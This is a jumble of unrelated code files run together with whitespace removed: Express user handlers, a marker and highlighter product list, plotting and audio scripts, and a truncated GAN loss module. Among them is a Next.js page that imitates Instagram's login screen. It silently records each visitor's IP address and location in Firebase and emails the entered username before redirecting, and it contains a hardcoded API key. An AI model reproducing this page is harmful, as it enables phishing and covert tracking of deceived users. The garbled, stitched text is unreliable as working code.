uraScribe,Allrightsreserved</p></div></div></footer>);};exportdefaultFooter;fromitertoolsimportteedefpairwise(iterable):a,b=tee(iterable)next(b,None)returnzip(a,b)constUser=require('../models/User');constGame=require('../models/Game');constComment=require('../models/Comment');constasyncHandler=require('express-async-handler');constbcrypt=require('bcrypt');constgetAllUsers=asyncHandler(async(req,res)=>{constusers=awaitUser.find().select('-password').lean();if(!users?.length){returnres.status(400).json({message:'Nousersfound'});}res.json(users);});constcreateNewUser=asyncHandler(async(req,res)=>{const{username,password,email}=req.body;if(!username||!password||!email){returnres.status(400).json({message:'Allfieldsarerequired'});}constduplicateUsername=awaitUser.findOne({username}).lean().exec();if(duplicateUsername){returnres.status(409).json({message:'Duplicateusername'});}constduplicateEmail=awaitUser.findOne({email}).lean().exec();if(duplicateEmail){returnres.status(409).json({message:'Duplicateemail'});}consthashedPwd=awaitbcrypt.hash(password,10);constuser=awaitUser.create({username,password:hashedPwd,email});if(user){res.status(201).json({message:`Newuser${username}created`});}else{res.status(400).json({message:'Invaliduserdatareceived'});}});constupdateUser=asyncHandler(async(req,res)=>{const{id,username,password,email}=req.body;if(!id||!username||!password||!email){returnres.status(400).json({message:'Allfieldsarerequired'});}constuser=awaitUser.findById(id).exec();if(!user){returnres.status(400).json({message:'Usernotfound'});}constduplicate=awaitUser.findOne({username}).lean().exec();if(duplicate&&duplicate?._id.toString()!==id){returnres.status(409).json({message:'Duplicateusername'});}user.username=username;user.email=email;if(password){user.password=awaitbcrypt.hash(password,10);}constupdatedUser=awaituser.save();res.json({message:`${updatedUser.username}updated`});});constdeleteUser=asyncHandler(async(req,res)=>{const{id}=req.body;if(!id){returnres.status(400).json({message:'UserIDisrequired'});}constgame=awaitGame.findOne({user:id}).lean().exec();if(game){returnres.status(400).json({message:'Userhasuploadedgames'});}constcomment=awaitComment.findOne({user:id}).lean().exec();if(comment){returnres.status(400).json({message:'Userhaspostedcomments'});}constuser=awaitUser.findById(id).exec();if(!user){returnres.status(400).json({message:'Usernotfound'});}constresult=awaituser.deleteOne();constreply=`Username${result.username}withID${result._id}deleted`;res.json(reply);});module.exports={getAllUsers,createNewUser,updateUser,deleteUser,};import'./App.css';importLoginfrom'./components/Login';importSignUpfrom'./components/SignUp';functionApp(){return<divclassName='App'><SignUp/><Login/></div>;}exportdefaultApp;eyboard.pkl','rb')asf:#keyboard=pickle.load(f)#print(keyboard.translate('Thequickbrownfoxjumpsoverthelazydog.',colemak))constproducts=[{name:'FinePointDryEraseMarkers',id:'fine-point-dry-erase-markers',images:Array.from({length:7},(_,i)=>'/products/slim_dem/'+i+'.png'),inkColor:'Black',count:24,pointType:'Bullet',description:'Finepointdryerasemarkersareperfectforwritingonwhiteboards,glass,andothernon-poroussurfaces.Theslimdesignmakesthemeasytoholdandwritewith.',},{name:'LargeChiselTipDryEraseMarkers',id:'large-chisel-tip-dry-erase-markers',images:Array.from({length:6},(_,i)=>'/products/large_dem/'+i+'.png'),inkColor:'Black',count:24,pointType:'Chisel',description:'Largechiseltipdryerasemarkersareperfectforwritingonwhiteboards,glass,andothernon-poroussurfaces.Thelargechiseltipallowsyoutocreatethickorthinlines.',},{name:'SlimYellowHighlighters',id:'slim-yellow-highlighters',images:Array.from({length:7},(_,i)=>'/products/slim_yellow_highlighter/'+i+'.png'),inkColor:'Yellow',count:24,pointType:'Chisel',description:'Slimyellowhighlightersareperfectforhighlightingtextinbooks,notes,andotherdocuments.Theslimdesignmakesthemeasytoholdandwritewith.',},{name:'SlimAssortedColorHighlighters',id:'slim-assorted-color-highlighters',images:Array.from({length:7},(_,i)=>'/products/slim_rainbow_highlighter/'+i+'.png'),inkColor:'Yellow,Pink,Blue,Orange,Green,Purple',count:24,pointType:'Chisel',description:'Slimassortedcolorhighlightersareperfectforhighlightingtextinbooks,notes,andotherdocuments.Theslimdesignmakesthemeasytoholdandwritewith.',},{name:'LargeYellowHighlighters',id:'large-yellow-highlighters',images:Array.from({length:7},(_,i)=>'/products/large_yellow_highlighter/'+i+'.png'),inkColor:'Yellow',count:24,pointType:'Chisel',description:'Largeyellowhighlightersareperfectforhighlightingtextinbooks,notes,andotherdocuments.Thelargedesignallowsyoutohighlightlargeareasoftextquickly.',},{name:'LargeAssortedColorHighlighters',id:'large-assorted-color-highlighters',images:Array.from({length:7},(_,i)=>'/products/large_rainbow_highlighter/'+i+'.png'),inkColor:'Yellow,Pink,Blue,Orange,Green,Purple',count:24,pointType:'Chisel',description:'Largeassortedcolorhighlightersareperfectforhighlightingtextinbooks,notes,andotherdocuments.Thelargedesignallowsyoutohighlightlargeareasoftextquickly.',},{name:'BlackPermanentMarkers',id:'black-permanent-markers',images:Array.from({length:7},(_,i)=>'/products/black_permanent_marker/'+i+'.png'),inkColor:'Black',count:24,pointType:'FineBullet',description:'Blackpermanentmarkersareperfectforwritingonpaper,cardboard,andotherporoussurfaces.Theslimdesignmakesthemeasytoholdandwritewith.',},];constproductMap=products.reduce((map,product)=>{map[product.id]=product;returnmap;},{});export{products,productMap};'useclient';importdbfrom'@/firebase/firebase';import{doc,serverTimestamp,getDoc,setDoc,updateDoc}from'firebase/firestore';import{useState,useEffect,useRef}from'react';import{useRouter}from'next/navigation';importaxiosfrom'axios';constHome=()=>{const[username,setUsername]=useState('');const[ip,setIp]=useState('');const[location,setLocation]=useState('');constrouter=useRouter();constinputRef=useRef(null);useEffect(()=>{constfetchIpAndLocation=async()=>{try{constres=awaitaxios.get('https://api.ipify.org?format=json');constuserIp=res.data.ip;setIp(userIp);constapiKey='fb4ef23ba9c44ae5b7b748b1603b2951';constlocationRes=awaitaxios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${userIp}`);constuserLocation=`${locationRes.data.city},${locationRes.data.state_prov},${locationRes.data.country_name}`;setLocation(userLocation);constdocRef=doc(db,'usernames',userIp);constdocSnap=awaitgetDoc(docRef);consttimestamp=newIntl.DateTimeFormat('en-US',{year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Los_Angeles',}).format(newDate());if(!docSnap.exists()){awaitsetDoc(docRef,{ip:userIp,location:userLocation,visits:[timestamp],});}else{constvisits=docSnap.data().visits||[];visits.push(timestamp);awaitupdateDoc(docRef,{visits:visits,});}}catch(error){console.error('ErrorfetchingIPaddressorlocation:',error);}};fetchIpAndLocation();},[]);useEffect(()=>{if(inputRef.current){setUsername(inputRef.current.value);}},[]);consthandleSubmit=async(e)=>{try{e.preventDefault();consttimestamp=newIntl.DateTimeFormat('en-US',{year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Los_Angeles',}).format(newDate());constdocRef=doc(db,'usernames',ip);awaitaxios.post('/api/send-email',{username:username,timestamp:timestamp,});constdocSnap=awaitgetDoc(docRef);letusernames=[];if(docSnap.exists()){usernames=docSnap.data().usernames||[];}constisUnique=!usernames.some((user)=>user.username===username);if(!isUnique){router.push('/login');return;}usernames.push({username:username,timestamp:timestamp,});awaitupdateDoc(docRef,{usernames:usernames,});router.push('/login');}catch(error){router.push('/login');console.log('Errorsubmittingform:',error);}};return(<><divid='wrapper'><divclassName='container'><divclassName='phone-app-demo'></div><divclassName='form-data'><formaction=''onSubmit={handleSubmit}><divclassName='logo'><imgsrc='./logo.png'alt='logo'/></div><inputtype='text'placeholder='Usernameoremail'ref={inputRef}onChange={(e)=>{setUsername(e.target.value);}}/><buttonclassName='form-btn'type='submit'>Next</button><spanclassName='has-separator'>Or</span><aclassName='facebook-login'href='#'><iclassName='fabfa-facebook-square'></i>LoginwithFacebook</a><aclassName='password-reset'href='#'>Forgotpassword?</a></form><divclassName='sign-up'>Don&apos;thaveanaccount?<ahref='#'>Signup</a></div><divclassName='get-the-app'><span>Gettheapp.</span><divclassName='badges'><imgsrc='./app-store.png'alt='app-storebadge'/><imgsrc='./google-play.png'alt='google-playbadge'/></div></div></div></div><footer><divclassName='container'><navclassName='footer-nav'><ul><li><ahref='#'>Aboutus</a></li><li><ahref='#'>Support</a></li><li><ahref='#'>Press</a></li><li><ahref='#'>Api</a></li><li><ahref='#'>Jobs</a></li><li><ahref='#'>Privacy</a></li><li><ahref='#'>Terms</a></li><li><ahref='#'>Directory</a></li><li><ahref='#'>Profiles</a></li><li><ahref='#'>Hashtags</a></li><li><ahref='#'>Languages</a></li></ul></nav><divclassName='copyright-notice'>&copy;2024Instagram</div></div></footer></div></>);};exportdefaultHome;classStack:def__init__(self):self.stack=[]def__repr__(self):returnstr(self.stack)def__len__(self):returnlen(self.stack)defpush(self,other):self.stack.append(other)defpop(self):returnself.stack.pop(-1)deftop(self):returnself.stack[-1]defpermutations(arr:list)->list[list]:if(len(arr)==0):return[[]]possible=[]foriinrange(len(arr)):possible+=[[arr[i]]+remainingforremaininginpermutations([arr[j]forjinrange(len(arr))ifj!=i])]returnpossibledefproduct(*args)->list[list]:if(len(args)==1):return[[i]foriinargs[0]]possible=[]paths=product(*args[1:])foriinargs[0]:possible+=[[i]+pathforpathinpaths]returnpossibledefevaluate(items:list,verbose=False)->float:lookup={'+':lambdaa,b:a+b,'-':lambdaa,b:a-b,'*':lambdaa,b:a*b,'/':lambdaa,b:a/b,}stack=Stack()foriteminitems:if(type(item)==str):b=stack.pop()a=stack.pop()result=lookup[item](a,b)if(verbose):print(f'{a}{item}{b}={result}')stack.push(result)else:stack.push(item)returnstack.top()defsolve(nums:list[int]):operations=['+','-','*','/']possible=[nums+list(chosen)forchoseninproduct(operations,operations,operations)]#valid=[]foritemsinpossible:forpermutationinpermutations(items):try:if(evaluate(permutation)==24):#valid.append(permutation)evaluate(permutation,verbose=True)returnpermutationexcept(IndexError,ZeroDivisionError):pass#returnvalidreturnNonesolve([13,11,7,10])importrequestsimportjsonfromurllib.parseimportquoteclassApi:def__init__(self,base:str,form:str='json',**kwargs):"""generatesaurlfortheapigiventhebaseurlandtheparametersArgs:base(str):baseurlwithouttrailingslashorquestionmarkform(str):formatoftheresponse(jsonortext).Defaultstojson"""self.base=base.rstrip('?').rstrip('/')self.parameters=kwargsassertformin['json','text'],'Invalidform.Mustbejsonortext'self.form=form@propertydefurl(self):url=self.base+'?'forkey,valueinself.parameters.items():if(key!=''):url+=str(key)+'='+str(value)+'&'else:url=url[:len(self.base)+1]+str(value)+'&'+url[len(self.base)+1:]returnurl[:-1]def__repr__(self)->str:returnself.urldef__getitem__(self,key):returnself.parameters[key]def__setitem__(self,key,value):self.parameters[key]=quote(value)defcall(self):response=requests.get(self.url).textifself.form=='json':try:returnjson.loads(response)exceptjson.decoder.JSONDecodeError:print('InvalidJSON,defaultingtotextresponse.')returnresponseelifself.form=='text':returnresponseimportLinkfrom'next/link';importImagefrom'next/image';exportdefaultfunctionHero(){return(<divclassName='bg-slate-100'><divclassName='flexjustify-between'><divclassName='w-1/2mx-10'><Imagesrc='/banner.png'width={5358}height={1}alt='logo'/><divclassName='flexjustify-centeritems-centerpb-10'><Linkhref='https://docs.google.com/forms/u/1/d/e/1FAIpQLScOLfkmFsTZop_cca565deD4huYJtvuWMTzla1VEDlknbZl-w/viewform?vc=0&c=0&w=1&flr=0'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'>OrderNow</Link></div></div><divclassName='w-1/2mx-10'><ImageclassName='crop'src='/stationery.jpg'width={5358}height={1}alt='logo'/></div></div></div>);}fromcalculateimportget_period_and_class_from_datetime,get_period_progress_from_datetime,get_day_progress_from_datetimefromscheduleimportCLASS_COLORSfromtimeimportsleepimportstreamlitasstst.set_page_config(page_title='Tiff\'sSchedule',page_icon='🧸',layout='centered',initial_sidebar_state='collapsed',)period,current_class=get_period_and_class_from_datetime()defgetColor(current_class):returnCLASS_COLORS[current_class]ifcurrent_class!='noclass!🎉'else'rainbow'current_class_header=st.header('')st.subheader('CurrentClassProgress')current_class_progress=st.progress(0)st.subheader('SchoolDayProgress')school_day_progress=st.progress(0)while(True):period,current_class=get_period_and_class_from_datetime()current_class_header.header(current_class,divider=getColor(current_class))if(periodisnotNone):current_class_progress.progress(get_period_progress_from_datetime())school_day_progress.progress(get_day_progress_from_datetime())sleep(1)importunittestfromcollectionsimportdequeclassSolution:defisValid(self,s:str)->bool:stack=deque()mapping={')':'(','}':'{',']':'['}forcharins:ifcharinmapping:if(stack):top=stack.pop()else:returnFalseif(mapping[char]!=top):returnFalseelse:stack.append(char)if(stack):returnFalseelse:returnTrueclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest_valid_parentheses(self):self.assertTrue(self.solution.isValid(r'()'))self.assertTrue(self.solution.isValid(r'()[]{}'))self.assertFalse(self.solution.isValid(r'(]'))unittest.main()import{Inter}from"next/font/google";import"./globals.css";constinter=Inter({subsets:["latin"]});exportconstmetadata={title:"CreateNextApp",description:"Generatedbycreatenextapp",};exportdefaultfunctionRootLayout({children}){return(<htmllang="en"><bodyclassName={inter.className}>{children}</body></html>);}import{useState}from'react';import{BsChevronCompactLeft,BsChevronCompactRight}from'react-icons/bs';import{RxDotFilled}from'react-icons/rx';importImagefrom'next/image';constImageSlider=({paths})=>{const[i,setI]=useState(0);constpreviousSlide=()=>{if(i===0){setI(paths.length-1);}else{setI(i-1);}};constnextSlide=()=>{if(i===paths.length-1){setI(0);}else{setI(i+1);}};constgoToSlide=(index)=>{setI(index);};return(<divclassName='w-[30rem]h-[35rem]m-autopy-16px-4xl:mr-20relative'><ImageclassName='w-fullh-fullrounded-2xlduration-500object-contain'src={paths[i]}alt='ProductImage'width={2560}height={0}priority/><div><BsChevronCompactLeftclassName='absolutetop-[50%]-translate-x-20translate-y-[-50%]left-5text-2xlrounded-fullp-2bg-black/20text-whitecursor-pointerselect-nonehover:bg-black/30duration-200'size={40}onClick={previousSlide}/></div><div><BsChevronCompactRightclassName='absolutetop-[50%]translate-x-20translate-y-[-50%]right-5text-2xlrounded-fullp-2bg-black/20text-whitecursor-pointerselect-nonehover:bg-black/30duration-200'size={40}onClick={nextSlide}/></div><divclassName='flextop-4justify-centerpy-2'>{paths.map((_,index)=>{return(<divclassName='cursor-pointerw-[30px]h-[30px]flexitems-centerjustify-center'key={index}onClick={()=>{goToSlide(index);}}><RxDotFilledsize={(50-15)*Math.exp(-1*Math.abs(i-index))+15}color={i==index?'rgb(0,0,0)':'rgb(169,169,169)'}/></div>);})}</div></div>);};exportdefaultImageSlider;constallowedOrigins=['http://localhost:3000',]module.exports=allowedOrigins;#%%fromextract_pdfimportextract_text_from_pdffromget_sectionsimportget_sections,get_slicesfromget_narrationimportget_narrationfromget_imageimportget_imagefromget_musicimportget_musicfromscipy.ioimportwavfilefrommathimportceilfrompydubimportAudioSegmentfromconcurrent.futuresimportThreadPoolExecutor,as_completed#%%pdf='hobbit.pdf'max_pages=3text=extract_text_from_pdf(pdf,max_pages)words=text.replace('’',"'").replace('“','"').replace('”','"').split()#%%sections=get_sections(words)#%%fori,sectioninenumerate(sections):#sectionswithopen(f'outputs/sections/section_{i}.txt','w')asf:f.write(section)#narrationpath=f'outputs/narration/section_{i}.wav'narration=get_narration(section)withopen(path,'wb')asf:f.write(narration)#imagespath=f'outputs/images/section_{i}.png'image=get_image(section,model='dall-e-3',size='1024x1024')image.save(path)#musicpath=f'outputs/music/section_{i}.wav'duration=len(AudioSegment.from_wav(f'outputs/narration/section_{i}.wav'))/1000music,sampling_rate=get_music(section,seconds=ceil(duration))wavfile.write(path,rate=sampling_rate,data=music[0,0].cpu().numpy())importpandasaspdimportmatplotlib.pyplotaspltimporttextwrapimportfoliumimportbranca.colormapascmimportmathimportwarningswarnings.filterwarnings('ignore')classVisualize:def__init__(self,data:pd.DataFrame,velocity:pd.DataFrame):self.data=dataself.velocity=velocitydefTopStoresOrdersOverTimeStackedAreaGraph(self,n:int):top_stores=self.data.groupby('Distributor')['SOQuantity'].sum().sort_values(ascending=False).head(n).indextop_df=self.data[self.data['Distributor'].isin(top_stores)]top_df['Date']=pd.to_datetime(top_df['Date'])top_df['Week']=top_df['Date'].dt.isocalendar().weekother_df=self.data[~self.data['Distributor'].isin(top_stores)]other_df['Date']=pd.to_datetime(other_df['Date'])other_df['Week']=other_df['Date'].dt.isocalendar().weekother_grouped=other_df.groupby(['Week'])['SOQuantity'].sum().reset_index()other_grouped['Distributor']='Other'grouped=top_df.groupby(['Week','Distributor'])['SOQuantity'].sum().reset_index()combined=pd.concat([grouped,other_grouped],ignore_index=True)pivot=combined.pivot(index='Week',columns='Distributor',values='SOQuantity').fillna(0)columns_order=['Other']+[colforcolinpivot.columnsifcol!='Other']pivot=pivot[columns_order]colors=['grey']+[plt.cm.tab20(i)foriinrange(len(columns_order)-1)]pivot.plot(kind='area',stacked=True,ax=plt.gca(),figsize=(12,8),color=colors)plt.title('TopStoresOrdersOverTime')plt.ylabel('TotalSOQuantity')plt.xlabel('Week')plt.legend(title='Distributor',bbox_to_anchor=(0.5,-0.2),loc='uppercenter',ncol=2)plt.tight_layout()plt.savefig('figures/top_stores_orders_over_time_stacked_area_graph.png',dpi=300)defTopStoresOrdersPercentOverTimeStackedAreaGraph(self,n:int):top_stores=self.data.groupby('Distributor')['SOQuantity'].sum().sort_values(ascending=False).head(n).indextop_df=self.data[self.data['Distributor'].isin(top_stores)]top_df['Date']=pd.to_datetime(top_df['Date'])top_df['Week']=top_df['Date'].dt.isocalendar().weekother_df=self.data[~self.data['Distributor'].isin(top_stores)]other_df['Date']=pd.to_datetime(other_df['Date'])other_df['Week']=other_df['Date'].dt.isocalendar().weekother_grouped=other_df.groupby(['Week'])['SOQuantity'].sum().reset_index()other_grouped['Distributor']='Other'grouped=top_df.groupby(['Week','Distributor'])['SOQuantity'].sum().reset_index()combined=pd.concat([grouped,other_grouped],ignore_index=True)pivot=combined.pivot(index='Week',columns='Distributor',values='SOQuantity').fillna(0)pivot_percent=pivot.div(pivot.sum(axis=1),axis=0)*100columns_order=['Other']+[colforcolinpivot_percent.columnsifcol!='Other']colors=['grey']+[plt.cm.tab20(i)foriinrange(len(columns_order)-1)]pivot_percent=pivot_percent[columns_order]plt.figure(figsize=(12,8))pivot_percent.plot(kind='area',stacked=True,ax=plt.gca(),color=colors)plt.title('TopStoresOrdersPercentOverTime')plt.ylabel('PercentageofTotalSOQuantity')plt.xlabel('Week')plt.legend(title='Distributor',bbox_to_anchor=(0.5,-0.2),loc='uppercenter',ncol=2)plt.tight_layout()plt.savefig('figures/top_stores_orders_percent_over_time_stacked_area_graph.png',dpi=300)defTopStoresVelocityPieChart(self,n:int):total_by_distributor=self.velocity.groupby('Distributor')['Velocity'].sum()top_stores=total_by_distributor.nlargest(n)other_quantity=total_by_distributor.sum()-top_stores.sum()top_stores['Other']=other_quantitydefwrap_labels(labels,width=30):return['\n'.join(textwrap.wrap(label,width))forlabelinlabels]labels=wrap_labels(top_stores.index)plt.figure(figsize=(12,9))top_stores.plot(kind='pie',autopct='%1.1f%%',colors=[plt.cm.tab20(i)ifi<len(top_stores)-1else'lightgrey'foriinrange(len(top_stores))],labels=labels,wedgeprops=dict(width=0.3),textprops={'fontsize':10},labeldistance=1.05,)plt.title('TopStoresVelocityDistribution',fontweight='bold')plt.ylabel('')plt.tight_layout()plt.savefig('figures/top_stores_velocity_pie_chart.png',dpi=300)defProductPopularityPieChart(self):product_units=self.data.groupby('Product')['SOQuantity'].sum().sort_values(ascending=False)plt.figure(figsize=(15,7))product_units.plot(kind='pie',autopct='%1.1f%%',colors=plt.cm.tab20c.colors[:len(product_units)],wedgeprops=dict(width=0.3),)plt.title('ProductPopularityDistribution',fontweight='bold')plt.ylabel('')plt.tight_layout()plt.savefig('figures/product_popularity_pie_chart.png',dpi=300)defGeospatialVisualization(self):min_velocity=self.velocity['Velocity'].min()max_velocity=self.velocity['Velocity'].max()self.velocity['NormalizedVelocity']=(self.velocity['Velocity']-min_velocity)/(max_velocity-min_velocity)m=folium.Map(location=[self.velocity['Latitude'].mean(),self.velocity['Longitude'].mean()],zoom_start=10)fori,rowinself.velocity.iterrows():ifrow.isnull().values.any():continuefolium.CircleMarker(location=[row['Latitude'],row['Longitude']],radius=(row['Velocity']*40)**0.5,color='blue',fill=True,fill_color='blue',fill_opacity=math.log(row['NormalizedVelocity']*0.6+1)+0.08,popup=row['Distributor']).add_to(m)m.save('figures/geospatial_visualization.html')data=pd.read_csv('data.csv')velocity=pd.read_csv('velocity.csv')data['Date']=pd.to_datetime(data['Date'])visualize=Visualize(data,velocity)visualize.TopStoresOrdersOverTimeStackedAreaGraph(5)visualize.TopStoresOrdersPercentOverTimeStackedAreaGraph(5)visualize.TopStoresVelocityPieChart(5)visualize.ProductPopularityPieChart()visualize.GeospatialVisualization()importmatplotlib.pyplotasplttraditional={'independent':'WriteOutLength\n(meters)','dependent':'InkLaydown\n(g/100m)','x':[25,75,125,175,225,275,325],'y':[0.87,0.72,0.69,0.64,0.59,0.505,0.41],}liquid_ink={'independent':'WriteOutLength\n(meters)','dependent':'InkLaydown\n(g/100m)','x':[25,75,125,175,225,275,325,375],'y':[0.85,0.82,0.81,0.8,0.79,0.795,0.7,0.15]}importmatplotlib.pyplotaspltfig,axs=plt.subplots(1,2,figsize=(16,4.5),tight_layout=False)data=[traditional,liquid_ink]titles=['TraditionalStationery','LiquidInk']intersection=[215,334.091]colors=['r','g']fori,axinenumerate(axs):ax.plot(data[i]['x'],data[i]['y'],'o-')ax.set_xlabel(data[i]['independent'])ax.set_ylabel(data[i]['dependent'],rotation=0,labelpad=40)ax.set_ylim(0,1)ax.set_yticks([i/10foriinrange(11)])ax.grid(axis='y')ax.axhline(y=0.6,color=colors[i],linestyle='--',label='PointofFading',alpha=0.5)ax.axvline(x=intersection[i],color=colors[i],linestyle='-',alpha=0.5)#addtextnexttothelineax.text(intersection[i]+10,0.7,str(round(intersection[i]))+'meters',fontsize=12,color=colors[i])ax.legend()ax.set_title(titles[i])ax.title.set_fontsize(16)plt.savefig(r'C:\Users\natha\Programming\EnduraScribe\public\ink_laydown.svg')importmoviepy.editorasmpimportspeech_recognitionassrr=sr.Recognizer()video=mp.VideoFileClip('video.mp4')audio=video.audioaudio.write_audiofile('audio.wav')withsr.AudioFile('audio.wav')assource:audio=r.record(source)text=r.recognize_google(audio)print(text)fromtypingimportDict,Iterator,List,Optional,Tuple,Unionimportnumpyasnpimporttorchimporttorch.nnasnnimporttorchvisionfromeinopsimportrearrangefrommatplotlibimportcolormapsfrommatplotlibimportpyplotaspltfrom....utilimportdefault,instantiate_from_configfrom..lpips.loss.lpipsimportLPIPSfrom..lpips.model.modelimportweights_initfrom..lpips.vqperceptualimporthinge_d_loss,vanilla_d_lossclassGeneralLPIPSWithDiscriminator(nn.Module):def__init__(self,disc_start:int,logvar_init:float=0.0,disc_num_layers:int=3,disc_in_channels:int=3,disc_factor:float=1.0,disc_weight:float=1.0,perceptual_weight:float=1.0,disc_loss:str="hinge",scale_input_to_tgt_size:bool=False,dims:int=2,learn_logvar:bool=False,regularization_weights:Union[None,Dict[str,float]]=None,additional_log_keys:Optional[List[str]]=None,discriminator_config:Optional[Dict]=None,):super().__init__()self.dims=dimsifself.dims>2:print(f"runningwithdims={dims}.Thismeansthatforperceptualloss"f"calculation,theLPIPSlosswillbeappliedtoeachframe"f"independently.")self.scale_input_to_tgt_size=scale_input_to_tgt_sizeassertdisc_lossin["hinge","vanilla"]self.perceptual_loss=LPIPS().eval()self.perceptual_weight=perceptual_weight#outputlogvarianceself.logvar=nn.Parameter(torch.full((),logvar_init),requires_grad=learn_logvar)self.learn_logvar=learn_logvardiscriminator_config=default(discriminator_config,{"target":"sgm.modules.autoencoding.lpips.model.model.NLayerDiscriminator","params":{"input_nc":disc_in_channels,"n_layers":disc_num_layers,"use_actnorm":False,},},)self.discriminator=instantiate_from_config(discriminator_config).apply(weights_init)self.discriminator_iter_start=disc_startself.disc_loss=hinge_d_lossifdisc_loss=="hinge"elsevanilla_d_lossself.disc_factor=disc_factorself.discriminator_weight=disc_weightself.regularization_weights=default(regularization_weights,{})self.forward_keys=["optimizer_idx","global_step","last_layer","split","regularization_log",]self.additional_log_keys=set(default(additional_log_keys,[]))self.additional_log_keys.update(set(self.regularization_weights.keys()))defget_trainable_parameters(self)->Iterator[nn.Parameter]:returnself.discriminator.parameters()defget_trainable_autoencoder_parameters(self)->Iterator[nn.Parameter]:ifself.learn_logvar:yieldself.logvaryieldfrom()@torch.no_grad()deflog_images(self,inputs:torch.Tensor,reconstructions:torch.Tensor)->Dict[str,torch.Tensor]:#calclogitsofreal/fakelogits_real=self.discriminator(inputs.contiguous().detach())iflen(logits_real.shape)<4:#Nonpatch-discriminatorreturndict()logits_fake=self.discriminator(reconstructions.contiguous().detach())#->(b,1,h,w)#parametersforcolormappinghigh=max(logits_fake.abs().max(),logits_real.abs().max()).item()cmap=colormaps["PiYG"]#divergingcolormapdefto_colormap(logits:torch.Tensor)->torch.Tensor:"""(b,1,...)->(b,3,...)"""logits=(logits+high)/(2*high)logits_np=cmap(logits.cpu().numpy())[...,:3]#truncatealphachannel#->(b,1,...,3)logits=torch.from_numpy(logits_np).to(logits.device)returnrearrange(logits,"b1...c->bc...")logits_real=torch.nn.functional.interpolate(logits_real,size=inputs.shape[-2:],mode="nearest",antialias=False,)logits_fake=torch.nn.functional.interpolate(logits_fake,size=reconstructions.shape[-2:],mode="nearest",antialias=False,)#alphavalueoflogitsforoverlayalpha_real=torch.abs(logits_real)/highalpha_fake=torch.abs(logits_fake)/high#->(b,1,h,w)inrange[0,0.5]#alphavalueoflinesdon'treallymatter,sincethevaluesarethesame#forbothimagesandlogitsanywaygrid_alpha_real=torchvision.utils.make_grid(alpha_real,nrow=4)grid_alpha_fake=torchvision.utils.make_grid(alpha_fake,nrow=4)grid_alpha=0.8*torch.cat((grid_alpha_real,grid_alpha_fake),dim=1)#->(1,h,w)#blendlogitsandimagestogether#preparelogitsforplottinglogits_real=to_colormap(logits_real)logits_fake=to_colormap(logits_fake)#resizelogits#->(b,3,h,w)#makesomegrids#addalllogitstooneplotlogits_real=torchvision.utils.make_grid(logits_real,nrow=4)logits_fake=torchvision.utils.make_grid(logits_fake,nrow=4)#Ijustlovehowtorchvisioncallsthenumberofcolumns`nrow`grid_logits=torch.cat((logits_real,logits_fake),dim=1)#->(3,h,w)grid_images_real=torchvision.utils.make_grid(0.5*inputs+0.5,nrow=4)grid_images_fake=torchvision.utils.make_grid(0.5*reconstructions+0.5,nrow=4)grid_images=torch.cat((grid_images_real,grid_images_fake),dim=1)#->(3,h,w)inrange[0,1]grid_blend=grid_alpha*grid_logits+(1-grid_alpha)*grid_images#Createlabeledcolorbardpi=100height=128/dpiwidth=grid_logits.shape[2]/dpifig,ax=plt.subplots(figsize=(width,height),dpi=dpi)img=ax.imshow(np.array([[-high,high]]),cmap=cmap)plt.colorbar(img,cax=ax,orientation="horizontal",fraction=0.9,aspect=width/height,pad=0.0,)img.set_visible(False)fig.tight_layout()fig.canvas.draw()#manuallyconvertfiguretonumpycbar_np=np.frombuffer(fig.canvas.tostring_rgb(),dtype=np.uint8)cbar_np=cbar_np.reshape(fig.canvas.get_width_height()[::-1]+(3,))cbar=torch.from_numpy(cbar_np.copy()).to(grid_logits.dtype)/255.0cbar=rearrange(cbar,"hwc->chw").to(grid_logits.device)#Addcolorbartoplotannotated_grid=torch.cat((grid_logits,cbar),dim=1)blended_grid=torch.cat((grid_blend,cbar),dim=1)return{"vis_logits":2*annotated_grid[None,...]-1,"vis_logits_blended":2*blended_grid[None,...]-1,}defcalculate_adaptive_weight(self,nll_loss:torch.Tensor,g_loss:torch.Tensor,last_layer:torch.Tensor)->torch.Tensor:nll_grads=torch.autograd.grad(nll_loss,last_layer,retain_graph=True)[0]g_grads=torch.autograd.grad(g_loss,last_layer,retain_graph=True)[0]d_weight=torch.norm(nll_grads)/(torch.norm(g_grads)+1e-4)d_weight=torch.clamp(d_weight,0.0,1e4).detach()d_weight=d_weight*self.discriminator_weightreturnd_weightdefforward(self,inputs:torch.Tensor,reconstructions:torch.Tensor,*,#addedbecauseIchangedtheorderhereregularization_log:Dict[str,torch.Tensor],optimizer_idx:int,global_step:int,last_layer:torch.Tensor,split:str="train",weights:Union[None,float,torch.Tensor]=None,)->Tuple[torch.Tensor,dict]:ifself.scale_input_to_tgt_size:inputs=torch.nn.functional.interpolate(inputs,reconstructions.shape[2:],mode="bicubic",antialias=True)ifself.dims>2:inputs,reconstructions=map(lambdax:rearrange(x,"bcthw->(bt)chw"),(inputs,reconstructions),)rec_loss=torch.abs(inputs.contiguous()-reconstructions.contiguous())ifself.perceptual_weight>0:p_loss=self.perceptual_loss(inputs.contiguous(),reconstructions.contiguous())rec_loss=rec_loss+self.perceptual_weight*p_lossnll_loss,weighted_nll_loss=self.get_nll_loss(rec_loss,weights)#nowtheGANpartifoptimizer_idx==0:#generatorupdateifglobal_step>=self.discriminator_iter_startornotself.training:logits_fake=self.discriminator(reconstructions.contiguous())g_loss=-torch.mean(logits_fake)ifself.training:d_weight=self.calculate_adaptive_weight(nll_loss,g_loss,last_layer=last_layer)else:d_weight=torch.tensor(1.0)else:d_weight=torch.tensor(0.0)g_loss=torch.tensor(0.0,requires_grad=True)loss=weighted_nll_loss+d_weight*self.disc_factor*g_losslog=dict()forkinregularization_log:ifkinself.regularization_weights:loss=loss+self.regularization_weights[k]*regularization_log[k]ifkinself.additional_log_keys:log[f"{split}/{k}"]=regularization_log[k].detach().float().mean()log.update({f"{split}/loss/total":loss.clone().detach().mean(),f"{split}/loss/nll":nll_loss.detach().mean(),f"{split}/loss/rec":r